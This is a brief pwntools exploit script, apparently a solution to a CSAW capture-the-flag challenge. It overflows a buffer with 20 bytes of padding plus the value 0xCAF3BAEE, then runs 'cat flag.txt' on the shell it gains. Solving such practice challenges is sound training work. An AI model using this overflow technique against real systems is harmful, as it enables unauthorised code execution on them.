p = remote("pwn.chal.csaw.io", 1436)
p.recvuntil(b"big boiiiii")
p.recvuntil(b"")
payload = b"A"*20 + p32(0xCAF3BAEE)
p.send(payload)
p.sendline(b"cat flag.txt")
print(p.recvall(timeout=5).decode("ascii", "ignore"))
